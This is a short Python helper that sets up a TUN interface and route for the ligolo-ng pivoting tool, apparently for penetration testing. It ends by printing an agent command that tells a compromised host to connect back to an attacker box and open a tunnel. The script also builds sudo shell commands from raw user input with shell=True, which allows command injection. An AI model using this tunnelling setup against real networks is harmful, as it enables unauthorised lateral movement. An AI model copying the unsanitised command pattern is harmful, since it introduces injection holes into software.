import subprocess

def run_command(command):
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")

def main():
    user = input("Enter the username for tuntap: ")
    ip_cidr = input("Enter the IP address and CIDR (e.g., 172.16.176.0/24): ")
    
    print("[+] Creating TUN/TAP interface...")
    run_command(f"sudo ip tuntap add user {user} mode tun ligolo")
    
    print("[+] Bringing up the interface...")
    run_command("sudo ip link set ligolo up")
    
    print("[+] Adding IP route...")
    run_command(f"sudo ip route add {ip_cidr} dev ligolo")
    
    print("[+] Configuration complete!")
    print("[***] Start proxy syntax : ./proxy -selfcert")
    print("[***] On agent side execute the following: ./agent.exe -connect <your_attack_box_ip>:11601 -ignore-cert")

if __name__ == "__main__":
    main()

